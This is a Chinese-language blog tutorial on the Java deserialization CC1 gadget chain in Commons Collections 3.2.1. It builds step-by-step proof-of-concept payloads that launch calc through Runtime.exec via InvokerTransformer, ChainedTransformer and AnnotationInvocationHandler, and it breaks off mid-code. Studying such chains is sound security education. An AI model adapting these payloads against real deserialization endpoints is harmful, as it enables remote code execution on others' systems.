# 漏洞篇 - Java 反序列化之 CC1 链
> 2024-05-10
> 来源：https://changeyourway.github.io/2024/05/10/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC1%E9%93%BE%E5%88%86%E6%9E%90/

Apache Commons Collections 是对 java.util.Collection 的扩展，对常用的集合操作进行了很好的封装、抽象和补充，在保证性能的同时大大简化代码。CC 链正是在 Commons Collections 包中的反序列化利用链，本次介绍的是 CC1 链。

## CC1 链

Apache Commons Collections 是对 java.util.Collection 的扩展，对常用的集合操作进行了很好的封装、抽象和补充，在保证性能的同时大大简化代码。

CC 链正是在 Commons Collections 包中的反序列化利用链，本次介绍的是 CC1 链。

### 环境准备

-   java = 8u65
-   CommonsCollections = 3.2.1

```
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```

### Transformer 接口

Apache Commons Collections 包中定义的一个接口，该接口的实现类中包含执行类。

```
package org.apache.commons.collections;

public interface Transformer {
    Object transform(Object var1);
}
```

该类中声明了一个 transform 方法。

鼠标双击选中类名后，Ctrl + H 可以查看该类的继承关系：

![](https://changeyourway.github.io/images/image-20240504111943167.png)

### 执行类 InvokerTransformer

该类实现了 Transformer 接口与 Serializable 接口，定义如下：

```
public class InvokerTransformer implements Transformer, Serializable
```

###### 利用点在 InvokerTransformer 类重写的 transform 方法中：

```
public Object transform(Object input) {
    if (input == null) {
        return null;
    } else {
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
            return method.invoke(input, this.iArgs);
        } catch (NoSuchMethodException var4) {
            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException var5) {
            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException var6) {
            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var6);
        }
    }
}
```

其中，

```
Class cls = input.getClass();
Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
return method.invoke(input, this.iArgs);
```

会通过反射执行 “input” 类的 “this.iMethodName” 方法，并将 “this.iParamTypes” 类型的参数 “this.iArgs” 传入。

再来看， input 是 transform 方法的参数，iMethodName ，iParamTypes 和 this.iArgs 都是 InvokerTransformer 中定义的属性：

```
private final String iMethodName;
private final Class[] iParamTypes;
private final Object[] iArgs;
```

并且在 InvokerTransformer 类的三参构造方法中会赋值：

```
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
    this.iMethodName = methodName;
    this.iParamTypes = paramTypes;
    this.iArgs = args;
}
```

也就是说，这里的所有参数均可控，那么可以简单的写个小程序验证一下。

###### 直接利用 InvokerTransformer 弹出计算器

```
public class Demo1 {
    public static void main(String[] args) {
        Runtime runtime = Runtime.getRuntime();
        InvokerTransformer invokerTransformer =
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        invokerTransformer.transform(runtime);
    }
}
```

运行结果：

![](https://changeyourway.github.io/images/image-20240504114336455.png)

成功弹出计算器，原理就是通过 invokerTransformer.transform 调用了 runtime 对象的 exec 方法并将 “calc” 作为参数传入。

接下来就是要找谁调用了 transform 方法，其实 TransformedMap 类调用了此方法。

### 利用链之 TransformedMap 类

TransformedMap 类的 checkSetValue 方法调用了 this.valueTransformer 的 transform 方法：

```
protected Object checkSetValue(Object value) {
    return this.valueTransformer.transform(value);
}
```

而 valueTransformer 是 TransformedMap 中定义的属性：

```
protected final Transformer valueTransformer;
```

这个属性在构造方法中被赋值：

```
protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    super(map);
    this.keyTransformer = keyTransformer;
    this.valueTransformer = valueTransformer;
}
```

由于构造方法是 protected 修饰的，不能直接被调用，所以还要找是谁调用了 TransformedMap 的构造方法。

TransformedMap 的 decorate 方法调用了 TransformedMap 的构造方法：

```
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}
```

通过这个方法，我们可以将 valueTransformer 属性赋值成 InvokerTransformer 类的对象。

或者也可以直接反射赋值。

接下来还要找是谁调用了 TransformedMap 的 checkSetValue 方法，AbstractInputCheckedMapDecorator 类调用了此方法。

### 利用链之 AbstractInputCheckedMapDecorator 类

AbstractInputCheckedMapDecorator 是 TransformedMap 的父类。

#### MapEntry 静态内部类

在这个类中有一个名为 MapEntry 的静态内部类：

```
static class MapEntry extends AbstractMapEntryDecorator {
    private final AbstractInputCheckedMapDecorator parent;

    protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
        super(entry);
        this.parent = parent;
    }

    public Object setValue(Object value) {
        value = this.parent.checkSetValue(value);
        return this.entry.setValue(value);
    }
}
```

MapEntry 的 setValue 方法中调用了 this.parent 的 checkSetValue 方法：

```
public Object setValue(Object value) {
        value = this.parent.checkSetValue(value);
        return this.entry.setValue(value);
}
```

parent 是 MapEntry 中定义的一个私有属性：

```
private final AbstractInputCheckedMapDecorator parent;
```

这个属性在 MapEntry 的构造方法中被赋值：

```
protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
        super(entry);
        this.parent = parent;
}
```

由于这个构造方法是被 protected 修饰的，所以还是要找是谁调用了它。其实是隔壁的静态内部类 EntrySetIterator 调用了它。

#### EntrySetIterator 静态内部类

EntrySetIterator 也是 AbstractInputCheckedMapDecorator 中的静态内部类：

```
static class EntrySetIterator extends AbstractIteratorDecorator {
    private final AbstractInputCheckedMapDecorator parent;

    protected EntrySetIterator(Iterator iterator, AbstractInputCheckedMapDecorator parent) {
        super(iterator);
        this.parent = parent;
    }

    public Object next() {
        Map.Entry entry = (Map.Entry)this.iterator.next();
        return new MapEntry(entry, this.parent);
    }
}
```

可以看到 EntrySetIterator 的 next 方法中调用了 MapEntry 的构造方法：

```
public Object next() {
        Map.Entry entry = (Map.Entry)this.iterator.next();
        return new MapEntry(entry, this.parent);
}
```

那么为了调用 EntrySetIterator 的 next 方法，我们需要创建一个 EntrySetIterator 对象，但 EntrySetIterator 的构造方法是被 protected 修饰的，所以还要找是谁调用了 EntrySetIterator 的构造方法。

而在隔壁的静态内部类 EntrySet 中调用了 EntrySetIterator 的构造方法

#### EntrySet 静态内部类

EntrySet 也是 AbstractInputCheckedMapDecorator 中的静态内部类：

```
static class EntrySet extends AbstractSetDecorator {
    private final AbstractInputCheckedMapDecorator parent;

    protected EntrySet(Set set, AbstractInputCheckedMapDecorator parent) {
        super(set);
        this.parent = parent;
    }

    public Iterator iterator() {
        return new EntrySetIterator(this.collection.iterator(), this.parent);
    }
    
    // 后面的部分省略
    ......
}
```

EntrySet 的 iterator 方法调用了 EntrySetIterator 的构造方法，同理，在哪里获得 EntrySet 对象呢？

#### entrySet 成员方法

AbstractInputCheckedMapDecorator 类的 public 方法 entrySet 调用了 EntrySet 的构造方法：

```
public Set entrySet() {
    return (Set)(this.isSetValueChecking() ? new EntrySet(this.map.entrySet(), this) : this.map.entrySet());
}
```

但是到这里还有个问题，获得 EntrySet 对象后怎么去调用它的 iterator 方法呢，以及获得 EntrySetIterator 对象后怎么去调用它的 next 方法呢，这个可以通过增强 for 循环遍历 map 来实现访问。

### 增强 for 循环遍历 map 的底层原理

`for (Map.Entry<String, Integer> entry : map.entrySet())` 实际上相当于以下的迭代器实现：

```
Iterator<Map.Entry<String, Integer>> iterator = map.entrySet().iterator();
while (iterator.hasNext()) {
    Map.Entry<String, Integer> entry = iterator.next();
    // 循环体内的代码
}
```

依此道理，如果将 map 赋值为 AbstractInputCheckedMapDecorator 抽象类的子类，

那么调用 map.entrySet() 方法时，实际上调用的是 AbstractInputCheckedMapDecorator 抽象类中实现的 entrySet() 方法，这个 entrySet() 方法会返回一个 EntrySet 对象，

那么 map.entrySet().iterator() 实际上调用的是 EntrySet 对象的 iterator 方法，而这个方法返回的是一个 EntrySetIterator 对象，

那么在接下来的 while 循环中调用的 iterator.next() 方法其实就是 EntrySetIterator 对象的 next() 方法，这个方法会调用 MapEntry 的构造方法，返回一个 MapEntry 对象，

最终 `for (Map.Entry<String, Integer> entry : map.entrySet())` 这个增强 for 获取到的 entry 就是一个 MapEntry 对象，

最后的最后，我们手动调用这个 entry 的 setValue 方法即可。

至此，整条链子就串联起来了。

### 写个程序实现上面的利用链

###### payload

下面的代码运行后会弹出计算器：

```
public class Demo2 {
    public static void main(String[] args) {
        Runtime runtime = Runtime.getRuntime();
        InvokerTransformer invokerTransformer =
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
                
        HashMap<Object, Object> map = new HashMap<>();
        map.put("key", "value");
        Map<Object, Object> transformedmap = TransformedMap.decorate(map, null, invokerTransformer);
        
        for (Map.Entry entry : transformedmap.entrySet()) {
            entry.setValue(runtime);
        }
    }
}
```

###### 通过调试来理解其中逻辑

Java 代码有一个特点，Java 的实例方法调用是基于运行时的实际类型的动态调用，而非变量的声明类型，这就是 Java 的多态性。

也因此，只有当程序运行起来才知道某个方法调用的究竟是哪个类的方法。所以说：调试是学习过程中必不可少的一环。

前面的逻辑应该都好理解，直接在最后一个 for 循环和 setValue 处下断点：

![](https://changeyourway.github.io/images/image-20240504161343935.png)

开始调试，单步进入：

![](https://changeyourway.github.io/images/image-20240504161514692.png)

此时来到了 AbstractInputCheckedMapDecorator 抽象类的 entrySet 方法，不过严格来说，应该是调用了 TransformedMap 的 entrySet 方法（因为 TransformedMap 继承了 AbstractInputCheckedMapDecorator 抽象类，拥有了它的所有方法，所以 TransformedMap 中其实是有 entrySet 方法的，只不过在代码上看不到）

**所以一个很重要的点是，这里的 this 指代的是谁？指代的是 AbstractInputCheckedMapDecorator 吗？不对，指代的是 TransformedMap 对象，一定记住，因为后续会将这个值层层传递下去。**

继续单步进入：

![](https://changeyourway.github.io/images/image-20240504161935980.png)

此时来到了 TransformedMap 重写的 isSetValueChecking 方法，由于 valueTransformer 已经被赋值，所以这里应当返回 true 。

继续单步进入：

![](https://changeyourway.github.io/images/image-20240504162201258.png)

由于上一步返回 true ，所以这里应当会调用 EntrySet 的构造方法。

继续单步进入：

![](https://changeyourway.github.io/images/image-20240504162305515.png)

调用了 EntrySet 的构造方法，并传入一个 TransformedMap 对象给 EntrySet 的私有属性 parent 赋值。

这里可以不用看了，直接 step out 跳出：

![](https://changeyourway.github.io/images/image-20240504162449686.png)

回到 entrySet 成员方法这里，此时应当返回一个 EntrySet 对象。

继续单步进入：

![](https://changeyourway.github.io/images/image-20240504162533758.png)

此时回到初始代码，准备开始 for 循环。

继续单步进入：

![](https://changeyourway.github.io/images/image-20240504162632352.png)

此时来到了 EntrySet 的 iterator 方法，获取 EntrySetIterator 对象。

继续单步进入，选择查看 EntrySetIterator 构造方法：

![](https://changeyourway.github.io/images/image-20240504162802621.png)

构造方法中将 EntrySet 的 parent 传了过来，赋值给了自己的私有属性 parent ，此时它是一个 TransformedMap 对象。

这里可以不用看了，直接 step out 跳出：

![](https://changeyourway.github.io/images/image-20240504163016036.png)

回到迭代器这里，这个方法将会返回一个 EntrySetIterator 对象。

继续单步进入：

![](https://changeyourway.github.io/images/image-20240504163117017.png)

回到了初始代码。

继续单步进入：

![](https://changeyourway.github.io/images/image-20240504163155507.png)

开始进行 hasNext 判断，因为是第一次遍历，集合中有值，这里应当返回 true 。

继续单步进入：

![](https://changeyourway.github.io/images/image-20240504163317122.png)

回到了初始代码。

继续单步进入：

![](https://changeyourway.github.io/images/image-20240504163347920.png)

此时来到了 EntrySetIterator 的 next 方法。

第一步可以不用看，直接 step over 进入下一步，再单步进入：

![](https://changeyourway.github.io/images/image-20240504163550283.png)

此时来到了 MapEntry 的构造方法，将 EntrySetIterator 的 parent 值传给了自己的私有属性 parent ，此时它是一个 TransformedMap 对象。

接下来可以不用看了，step out 跳出构造方法，再跳出 EntrySetIterator 的 next 方法，回到初始代码这里：

![](https://changeyourway.github.io/images/image-20240504163849962.png)

此时的 entry 是一个 MapEntry 对象，单步进入它的 setValue 方法：

![](https://changeyourway.github.io/images/image-20240504164026799.png)

接下来会进入 this.parent 的 checkSetValue 方法，如上所言，this.parent 应当指代的是 TransformedMap 对象，那么接下来会调用这个 TransformedMap 对象的 checkSetValue 方法，单步进入看看：

![](https://changeyourway.github.io/images/image-20240504165625348.png)

没问题，接下来会调用 valueTransformer 的 transform 方法，valueTransformer 已经被赋值为一个 InvokerTransformer 对象，接下来将会调用 InvokerTransformer 的 transform 方法。

单步进入：

![](https://changeyourway.github.io/images/image-20240504165945559.png)

这个 InvokerTransformer 对象也已经被初始化，前面的 setValue 的参数 runtime 传递给了 checkSetValue ，最后又传递给了 transform ，所以这里的 input 参数应当是一个 Runtime 对象。

到这里就可以直接下一步下一步了，执行完 method.invoke 就会弹出计算器：

![](https://changeyourway.github.io/images/image-20240504170319433.png)

好了，后面的就不调了。通过这次调试，想必逻辑大致能理清楚了。

### 反序列化利用

作为一条反序列化利用链，最终还是要归到 readObject 这里，毕竟实际情况下 setValue 可不是我们自己能手动调用的，所以我们要找谁的 readObject 方法里调用了 setValue 。

AnnotationInvocationHandler 类的 readObject 方法里就调用了 setValue 。

#### 入口类 AnnotationInvocationHandler

看看 readObject 方法：

```
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
    var1.defaultReadObject();
    AnnotationType var2 = null;

    try {
        var2 = AnnotationType.getInstance(this.type);
    } catch (IllegalArgumentException var9) {
        throw new InvalidObjectException("Non-annotation type in annotation serial stream");
    }

    Map var3 = var2.memberTypes();
    Iterator var4 = this.memberValues.entrySet().iterator();

    while(var4.hasNext()) {
        Map.Entry var5 = (Map.Entry)var4.next();
        String var6 = (String)var5.getKey();
        Class var7 = (Class)var3.get(var6);
        if (var7 != null) {
            Object var8 = var5.getValue();
            if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
            }
        }
    }

}
```

有没有发现跟前面增强 for 循环的底层原理有几分神似？如果没有发现的话我把这一段截取出来：

```
Iterator var4 = this.memberValues.entrySet().iterator();

while(var4.hasNext()) {
    Map.Entry var5 = (Map.Entry)var4.next();
```

依葫芦画瓢，我们想让这个 memberValues 变成 TransformedMap 对象，那么同理 var5 将会被赋值为一个 MapEntry 对象。在之后经过两重判断，就会调用 var5 的 setValue 了。

memberValues 是 AnnotationInvocationHandler 类中定义的一个属性：

```
private final Map<String, Object> memberValues;
```

而这个属性在构造方法中被赋值：

```
AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
    Class[] var3 = var1.getInterfaces();
    if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) {
        this.type = var1;
        this.memberValues = var2;
    } else {
        throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
    }
}
```

但是由于构造方法没有被 public 修饰（不写修饰符默认 default ），不能直接调用，所以我们用反射来获取构造方法。

在构造方法中我们也可以看到对传入的参数 var1 做了一些检查：

1.  `var3 = var1.getInterfaces()`：这一行代码获取了 `var1` 类对象实现的所有接口，并将它们存储在 `var3` 数组中。
2.  `if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class)`：这一行代码是一个条件语句，其中包含三个条件：
    -   `var1.isAnnotation()` 检查 `var1` 是否是一个注解类型。如果 `var1` 是一个注解类型，则返回 `true`。
    -   `var3.length == 1` 检查 `var1` 实现的接口数量是否为 1。如果是，则返回 `true`。
    -   `var3[0] == Annotation.class` 检查 `var1` 实现的接口中的第一个接口是否是 `Annotation` 接口。如果是，则返回 `true`。

为了满足上述条件，我们初步选择传入 Override.class 作为 var1 的值，于是就得到了 payload1 ：

#### payload1

```
public class payload1 {
    public static void main(String[] args) throws Exception {
        // 获取 Runtime 对象
        Runtime r = Runtime.getRuntime();

        // 初始化执行类 InvokerTransformer
        InvokerTransformer invokerTransformer =
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});

        HashMap<Object, Object> map = new HashMap<>();
        map.put("key", "value");

        // 初始化利用链 TransformedMap
        Map<Object, Object> transformedmap = TransformedMap.decorate(map, null, invokerTransformer);

        // 利用反射修改入口类 AnnotationInvocationHandler 的 memberValues 属性
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationConstructor.setAccessible(true);
        // 为了通过 isAnnotation 判断，选择将 Override.class 传入第一个参数
        Object o = annotationInvocationConstructor.newInstance(Override.class, transformedmap);

        // serialize(o);
        unserialize("ser.bin");

    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

}
```

先序列化再反序列化，反序列化时应当弹出计算器。但实际上什么也没发生。原因有很多，先来解决第一个。

#### Runtime 类不能被序列化解决办法

翻看 Runtime 类的定义，会发现它并没有实现 Serializable 接口：

```
public class Runtime
```

要如何解决这个问题呢？在前面的学习中我们能发现 InvokerTransformer 类的 transform 方法能够通过执行任意类的任意方法，假如我们让它执行 Runtime.class 对象的 getDeclaredMethod 方法，并将 getRuntime 作为参数传入，那么我们就能获取到 Runtime 的 getRuntime 方法了。

**具体代码如下：**

```
Method getRuntimeMethod = 
    (Method)new InvokerTransformer
         ("getDeclaredMethod",
         new Class[]{String.class,Class[].class},
         new Object[]{"getRuntime",null}).transform(Runtime.class);
```

其实就相当于这句代码：

```
Method getRuntimeMethod = Runtime.class.getDeclaredMethod("getRuntime",null)
```

这样得到的 getRuntimeMethod 就是 Runtime 的 getRuntime 方法了。

**接下来我要调用 getRuntimeMethod 方法，还是通过 InvokerTransformer 类的 transform 方法来调用：**

```
Runtime r =
    (Runtime) new InvokerTransformer
         ("invoke",
         new Class[]{Object.class,Object[].class},
         new Object[]{null,null}).transform(getRuntimeMethod);
```

其实就相当于这句代码：

```
Runtime runtime = getRuntimeMethod.invoke(null, null)
```

执行 getRuntime 方法后返回 Runtime 对象，很合理。

**接下来我要调用这个 Runtime 对象的 exec 方法，依然是通过 InvokerTransformer 类的 transform 方法来调用：**

```
new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(runtime);
```

其实就相当于这句代码：

```
runtime.exec("calc")
```

经过上面的三步操作就可以调用 exec 恶意函数了。但其实这段代码还可以再优雅一点，可以用 ChainedTransformer 类来简化操作。

#### ChainedTransformer 类

**利用 ChainedTransformer 可将上述三段代码简化成如下代码：**

```
Transformer[] transformers = new Transformer[]{
        new InvokerTransformer
                ("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer
                ("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
        new InvokerTransformer
                ("exec", new Class[]{String.class}, new Object[]{"calc"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
chainedTransformer.transform(Runtime.class);
```

**要了解具体原理，我们可以查看 chainedTransformer 类的构造方法：**

```
public ChainedTransformer(Transformer[] transformers) {
    this.iTransformers = transformers;
}
```

可以看到，构造方法中接收一个 Transformer 数组，并将这个数组赋值给 this.iTransformers 。

**而 iTransformers 是 ChainedTransformer 中定义的属性：**

```
private final Transformer[] iTransformers;
```

**接着来看 chainedTransformer 类的 transform 方法：**

```
public Object transform(Object object) {
    for(int i = 0; i < this.iTransformers.length; ++i) {
        object = this.iTransformers[i].transform(object);
    }

    return object;
}
```

chainedTransformer 类的 transform 方法遍历 iTransformers 数组中的每一个元素并依次执行它们的 transform 方法，并将前一个 transform 方法的结果作为后一个 transform 方法的参数。

看到这里就应该大致能明白了，就是把数组中的每一个 InvokerTransformer 对象取出来再调用它们的 transform 方法，并把上一段代码的输出作为下一段代码的输入，这样就完美替代了上面的三段代码。于是我们得到 payload2：

#### payload2

```
public class payload2 {
    public static void main(String[] args) throws Exception {
        // 获取包含执行类 InvokerTransformer 的 ChainedTransformer 对象
        Transformer[] transformers = new Transformer[]{
                new InvokerTransformer
                        ("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer
                        ("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer
                        ("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        
        // 随便构造一个 Map 对象作为 TransformedMap.decorate 的参数
        HashMap<Object, Object> map = new HashMap<>();
        map.put("key", "value");
        
        // 初始化利用链 TransformedMap
        Map<Object, Object> transformedmap = TransformedMap.decorate(map, null, chainedTransformer);

        // 利用反射修改入口类 AnnotationInvocationHandler 的 memberValues 属性
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationConstructor.setAccessible(true);
        // 为了通过 isAnnotation 判断，选择将 Override.class 传入第一个参数
        Object o = annotationInvocationConstructor.newInstance(Override.class, transformedmap);

        serialize(o);
        // unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

payload2 解决了 Runtime 类不能被序列化的问题，在序列化时，由于 ChainedTransformer 的 transform 方法并没有被执行，所以并没有生成 Runtime 对象，只有在反序列化 readObject 时才被执行。

但是 payload2 还是无法使用，这是因为 AnnotationInvocationHandler 类的 readObject 方法中的最后一个 while 循环中还有两个判断没绕过，以及 var5 的 setValue 方法的参数还没有作控制。

#### 判断绕过

###### 这里再贴一下 AnnotationInvocationHandler 类的 readObject 方法：

```
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
    var1.defaultReadObject();
    AnnotationType var2 = null;

    try {
        var2 = AnnotationType.getInstance(this.type);
    } catch (IllegalArgumentException var9) {
        throw new InvalidObjectException("Non-annotation type in annotation serial stream");
    }

    Map var3 = var2.memberTypes();
    Iterator var4 = this.memberValues.entrySet().iterator();

    while(var4.hasNext()) {
        Map.Entry var5 = (Map.Entry)var4.next();
        String var6 = (String)var5.getKey();
        Class var7 = (Class)var3.get(var6);
        if (var7 != null) {
            Object var8 = var5.getValue();
            if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
            }
        }
    }

}
```

###### 第一重判断 `if (var7 != null)` 绕过

为了经过第一重判断，我们需要追本溯源，看看 var7 是怎么来的：

```
Class var7 = (Class)var3.get(var6);
```

var7 是通过 var3 的 get 方法获取到的，看看 var3 是怎么来的：

```
Map var3 = var2.memberTypes();
```

var3 是通过 var2 的 memberTypes 方法获取到的 Map 对象，因此 var3 的 get 方法应当是根据键返回对应的值。

看看 var2 怎么来的：

```
AnnotationType var2 = null;

try {
    var2 = AnnotationType.getInstance(this.type);
} catch (IllegalArgumentException var9) {
    throw new InvalidObjectException("Non-annotation type in annotation serial stream");
}
```

var2 是一个 AnnotationType 对象，见名知义，就是注解类型。这里是调用了 AnnotationType.getInstance 方法再将 this.type 作为参数传入。

而 type 是 AnnotationInvocationHandler 类中定义的一个属性：

```
private final Class<? extends Annotation> type;
```

与 memberValues 一同在构造方法中被赋值：

```
AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
    Class[] var3 = var1.getInterfaces();
    if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) {
        this.type = var1;
        this.memberValues = var2;
    } else {
        throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
    }
}
```

可以看到 this.type 其实就是我们传入的注解类 Override.class 。

**梳理一下上面的过程**

传入的 Override.class 就是 AnnotationInvocationHandler 类的 type 属性值；

type 属性值被传入 AnnotationType.getInstance 方法作为参数，得到的返回值就是 var2 ，而 AnnotationType 类的 getInstance 方法会返回一个包含指定注解的信息的 AnnotationType 对象；

接下来调用 var2 的 memberTypes 方法获取 var2 的 memberTypes 属性，并将其赋值给 var3。memberTypes 属性的值是在 AnnotationType.getInstance 方法调用时被赋予的，即传入的指定注解（Override.class）的成员属性的类型。由于 Override 类并没有成员属性，所以 memberTypes 为空，所以 var3 也为空。

那么接下来通过 var3 的 get 方法获取到的 var7 自然也为空。

**解决方案**

为了解决这个问题，只需要传入一个有成员属性的注解类即可，这里选择 Target.class（选其他的也可以，比如 Retention.class）：

```
@Documented
@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.ANNOTATION_TYPE)
public @interface Target {
    /**
     * Returns an array of the kinds of elements an annotation type
     * can be applied to.
     * @return an array of the kinds of elements an annotation type
     * can be applied to
     */
    ElementType[] value();
}
```

并且在调用 var3 的 get 方法时需要传入一个参数 var6 ，所以需要修改 var6 为此时 var3 中存在的键名 value（这个键名是通过调试知道的，后面会调试），这样就能顺利地调用 get 方法获取键名中的键值了。

var6 是这样来的

```
Map.Entry var5 = (Map.Entry)var4.next();
String var6 = (String)var5.getKey();
```

前面在分析入口类 AnnotationInvocationHandler 的 readObject 方法时，我们讲到 var5 应该是一个 MapEntry 对象，这个对象中存储的键值对其实就是我们给 TransformedMap.decorate 方法传入的 map 参数，那么我们直接修改传入的键为 value 即可。

于是得到 payload3：

###### payload3

```
public class payload3 {
    public static void main(String[] args) throws Exception {
        // 获取包含执行类的 ChainedTransformer 对象
        Transformer[] transformers = new Transformer[]{
                new InvokerTransformer
                        ("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer
                        ("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer
                        ("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        // 构造一个 Map 对象，键为 value 
        HashMap<Object, Object> map = new HashMap<>();
        map.put("value", "test");

        // 初始化利用链 TransformedMap 
        Map<Object, Object> transformedmap = TransformedMap.decorate(map, null, chainedTransformer);

        // 利用反射修改入口类 AnnotationInvocationHandler 的 memberValues 属性
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationConstructor.setAccessible(true);
        // 将有成员属性的 Target.class 传入
        Object o = annotationInvocationConstructor.newInstance(Target.class, transformedmap);

        // serialize(o);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

###### 第二重判断 `if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy))` 绕过

我们通过调试 payload3 来查看此时的 var7 ，var8 分别是什么，顺便解答一下前面的疑惑。

**payload3 中在 readObject 处下一个断点：**

![](https://changeyourway.github.io/images/image-20240508144239204.png)

**AnnotationInvocationHandler 类的 readObject 方法下四个断点：**

![](https://changeyourway.github.io/images/image-20240508144351664.png)

**开始调试，直接跳断点就可以了：**

![](https://changeyourway.github.io/images/image-20240508144500086.png)

**接下来我们来看 var2 在初始化之后是什么：**

![](https://changeyourway.github.io/images/image-20240508144628535.png)

可以看到 var2 是一个 AnnotationType 对象，而且其 memberTypes 属性是一个 HashMap 对象，其中的键值对是 “value” -> Target 成员属性的类型 ElementType 。

**看看 var3 被赋值后是什么：**

![](https://changeyourway.github.io/images/image-20240508145136656.png)

var3 获取到的是 var2 的 memberTypes 属性值。

**看看 var7 被赋值后是什么：**

![](https://changeyourway.github.io/images/image-20240508145350346.png)

var7 获取到的就是 var3 键值对中的值。由于 var7 不为空，进入判断。

\*\*看看 var8 被赋值后是什么，断点不够了再加俩断点： \*\*

![](https://changeyourway.github.io/images/image-20240508145858661.png)

var8 获取到的是 payload3 中传入的 map 值，这也在预期之中。

**接下来单步进入判断，想不到直接就过去了：**

![](https://changeyourway.github.io/images/image-20240508150053698.png)

点进 var7 的 isInstance 方法去看了一下，在文档中发现这个方法与 instanceof 等效，instanceof 是判断其左边对象是否为其右边类的实例 ，而 isInstance 是 Class 类中的方法，也是用于判断某个实例是否是某个类的实例化对象，但是指向则相反：

![](https://changeyourway.github.io/images/image-20240508150947421.png)

这样就解释得通了，var8 并不是 ElementType 类的对象，var8 也并不是 ExceptionProxy 类的对象，所以这个判断直接过了。

那么就只剩下最后一个问题了：var5 的 setValue 方法参数不可控。

#### var5 的 setValue 方法参数不可控解决办法

按道理，我们想让 var5 的 setValue 方法参数为 Runtime.class ，但是这里的参数明显不能让我们达成目的。这就要提到 Transformer 接口的一个子类 ConstantTransformer 了。

###### ConstantTransformer 类

```
public class ConstantTransformer implements Transformer, Serializable {
    private static final long serialVersionUID = 6374440726369055124L;
    public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null);
    private final Object iConstant;

    public static Transformer getInstance(Object constantToReturn) {
        return (Transformer)(constantToReturn == null ? NULL_INSTANCE : new ConstantTransformer(constantToReturn));
    }

    public ConstantTransformer(Object constantToReturn) {
